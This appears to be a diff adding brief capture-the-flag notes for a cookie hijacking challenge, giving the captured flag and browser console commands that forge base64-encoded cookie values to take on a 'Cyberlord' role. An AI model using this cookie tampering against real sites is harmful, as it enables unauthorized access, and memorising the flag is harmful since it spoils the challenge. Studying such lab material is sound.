@@ -1,0 +1,27 @@
+The Flag
+flag{Cyb3rL0rds_E4T_C00ki3s_4_Br34kfast}
+
+COOKIE SESSION HIJACKING
+
+Ctl+I
+
+document.cookie
+
+javascript:void(document.cookie="cookiename='QnlwYXNzZXJz'");
+
+cookie out os base = Bypassers
+
+We Need To SET a NEW ONE !!!!
+
+HINT -- Only Cyberlords can GET IN !
+
+javascript:void(document.cookie="cookiename='QnlwYXNzZXJz'");
+
+Cyberlord in base == QnlwYXNzZXJz
+
+becomes
+
+
+javascript:void(document.cookie="role='Q3liZXJsb3Jk'"); # roll change as not called cookie
+
+javascript:void(document.cookie="role='Q3liZXJsb3Jk'");
